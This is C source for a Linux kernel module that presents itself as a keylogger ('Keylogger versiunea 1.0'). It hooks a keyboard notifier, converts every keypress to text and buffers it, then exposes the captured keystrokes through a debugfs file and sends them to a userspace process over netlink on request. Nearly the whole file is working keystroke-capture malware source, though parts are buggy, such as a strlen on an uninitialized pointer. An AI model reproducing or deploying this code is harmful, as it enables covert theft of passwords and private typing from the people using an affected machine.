
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/keyboard.h>
#include <linux/debugfs.h>
#include <linux/input.h>

#include <linux/net.h>
#include <net/sock.h>
#include <linux/tcp.h>
#include <linux/in.h>
#include <asm/uaccess.h>
#include <linux/file.h>
#include <linux/socket.h>
#include <linux/slab.h>

#include <uapi/linux/uio.h>
#include <linux/uio.h>

#define WRITESIZE (10)
#define BUF_LEN (4096)
#define ERROR 1
#define KEYL_VERS "1.0"
#define FILE_PATH "/home/radu/Desktop/keys.txt"

#include <linux/module.h>
#include <net/sock.h>
#include <linux/netlink.h>
#include <linux/skbuff.h>


#define MY_NETLINK 30  // cannot be larger than 31, otherwise we shall get "insmod: ERROR: could not insert module netlink_kernel.ko: No child processes"


struct sock *nl_sk = NULL;

//Buffer pe care se face "flush"
static char keys_buf[BUF_LEN];
//Ultimul element din buffer
static size_t buffer_index;


static void myNetLink_recv_msg(struct sk_buff *skb)
{
    struct nlmsghdr *nlhead;
    struct sk_buff *skb_out;
    int pid, res, msg_size;
    char*msg; 
	char* mesaj="NULL!";

    printk(KERN_INFO "Entering: %s\n", __FUNCTION__);

    msg_size = strlen(msg);

    nlhead = (struct nlmsghdr*)skb->data;    //nlhead message comes from skb's data... (sk_buff: unsigned char *data)

    printk(KERN_INFO "Received: %s\n",(char*)nlmsg_data(nlhead));
	if(buffer_index==0)
	{
	msg=mesaj;
	msg_size=strlen(mesaj);
	}
	if(buffer_index!=0)
	{
	msg=&keys_buf[0];
	msg_size=buffer_index;
	buffer_index=0;
	}
	
    pid = nlhead->nlmsg_pid; // Sending process port ID, will send new message back to the 'user space sender'

	printk("MSJ ESTE:%s\n",msg);
    skb_out = nlmsg_new(msg_size, 0);    //nlmsg_new - Allocate a new netlink message: skb_out

    if(!skb_out)
    {
        printk(KERN_ERR "Failed to allocate new skb\n");
        return;
    }

    nlhead = nlmsg_put(skb_out, 0, 0, NLMSG_DONE, msg_size, 0);   // Add a new netlink message to an skb

    NETLINK_CB(skb_out).dst_group = 0;                  


    strncpy(nlmsg_data(nlhead), msg, msg_size); //char *strncpy(char *dest, const char *src, size_t count)

    res = nlmsg_unicast(nl_sk, skb_out, pid); 

    if(res < 0)
        printk(KERN_INFO "Error while sending back to user\n");
	
}



static ssize_t keys_read(struct file *filp,char *buffer,size_t len,loff_t *offset);
static int spy_keys(struct notifier_block *nblock,unsigned long code,void *_param);


//dentry * file tine un pointer catre fisierul unde se vor scrie tastele apasate
static struct dentry *parent_dir;
static struct dentry *file;

//Test: fisier din afara directorului -debug- folosit pentru a scrie tastele apasate
struct file* fileToWrite;
//offset in cadrul fisierului (filp->f_pos)
long long offset=0;



const struct file_operations key_operations = {.owner = THIS_MODULE,.read = keys_read,};

static struct notifier_block current_nblock = {.notifier_call = spy_keys,};

//Matrice scancodes->keys
static const char *scancode_to_text[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},      
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, 
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, 
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},        
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, 
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},     
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},    
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},  
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         
	{"_PAUSE_", "_PAUSE_"},                                         
};

// Test: Operatii pe fisier din modul kernel
void openFileToWrite(void) 
{
 	fileToWrite = filp_open(FILE_PATH, O_RDWR | O_CREAT, 0644);
   
}
void file_close(struct file *file) 
{
    filp_close(file, NULL);
}
void file_write(struct file *file, unsigned long long offset, unsigned char *data, unsigned int size) 
{
   kernel_write(file, data, size, &offset);
}


static ssize_t keys_read(struct file *filp,char *buffer,size_t len,loff_t *offset)
{
	return simple_read_from_buffer(buffer, len, offset, keys_buf, buffer_index);
}


//In functie de tipul de scriere (view_type) se pune in buffer tasta apasata
void keycode_to_string(int scancode, int view_type, char *buffer)
{
	if (scancode > KEY_RESERVED && scancode <= KEY_PAUSE) {
			const char* ptr_key;
			if(view_type==1)
			{
				ptr_key=scancode_to_text[scancode][1];
			}
			else
			{
				ptr_key=scancode_to_text[scancode][0];
			}
			

			snprintf(buffer, WRITESIZE, "%s", ptr_key);
		}
	
}

int spy_keys(struct notifier_block *nblock,unsigned long code,void *_param)
{
	size_t buffer_length;
	char my_key_buffer[WRITESIZE] = {0};
	struct keyboard_notifier_param *param = _param;

	if (!(param->down)){
		return NOTIFY_OK;
	}
	
	keycode_to_string(param->value, param->shift, my_key_buffer);
	buffer_length = strlen(my_key_buffer);

	if (buffer_length < 1) {
		return NOTIFY_OK;
	}
	
	//overflow reseteaza index
	if ((buffer_index + buffer_length) >= BUF_LEN){
		buffer_index = 0;
	}

	strncpy(keys_buf + buffer_index, my_key_buffer, buffer_length);
	buffer_index += buffer_length;

	pr_debug("%s\n", my_key_buffer);
	

	return NOTIFY_OK;
}

static void send_reply(struct socket *sock, char *str)
{
	struct msghdr msg;
	struct iovec iov = {}; 
	
	
	msg.msg_name = NULL;
    msg.msg_control = NULL;
    msg.msg_controllen = 0;
    msg.msg_namelen = 0;

	unsigned long nr_segments = 1;
	size_t count = 1;
	void __user* message="Alabala!";
	iov.iov_base = message;
	iov.iov_len = 9;
	
	import_single_range(WRITE, message, 9, &iov, &msg.msg_iter);
	
	
    int size=sock_sendmsg(sock, &msg);
	
}
unsigned int inet_addr(char *str)
{
	int a,b,c,d;
	char arr[4];
	sscanf(str,"%d.%d.%d.%d",&a,&b,&c,&d);
	arr[0] = a; arr[1] = b; arr[2] = c; arr[3] = d;
	return *(unsigned int*)arr;
} 
static int __init initModule(void)
{
	
struct netlink_kernel_cfg cfg = {
        .input = myNetLink_recv_msg,
    };

       
    nl_sk = netlink_kernel_create(&init_net, MY_NETLINK, &cfg);
   
    if(!nl_sk)
    {
        printk(KERN_ALERT "Error creating socket.\n");
        return -10;
    }

	openFileToWrite();
	parent_dir = debugfs_create_dir("myModuleKeylogger", NULL);
	if (IS_ERR(parent_dir))
		return PTR_ERR(parent_dir);
	if (!parent_dir)
		return ERROR;

	file = debugfs_create_file("logg.txt", 0400, parent_dir, NULL, &key_operations);
	if (!file) {
		debugfs_remove_recursive(parent_dir);
		return ERROR;
	}

	register_keyboard_notifier(&current_nblock);
	return 0;
}


static void __exit exitModule(void)
{
	unregister_keyboard_notifier(&current_nblock);
	debugfs_remove_recursive(parent_dir);
	file_close(fileToWrite);
	netlink_kernel_release(nl_sk);
}

module_init(initModule);
module_exit(exitModule);


MODULE_LICENSE("GPL v2");
MODULE_AUTHOR("Dumitrascu Andrei && Mitran Luca");
MODULE_VERSION(KEYL_VERS);
MODULE_DESCRIPTION("Keylogger versiunea 1.0...Afla tot ce tastezi...");
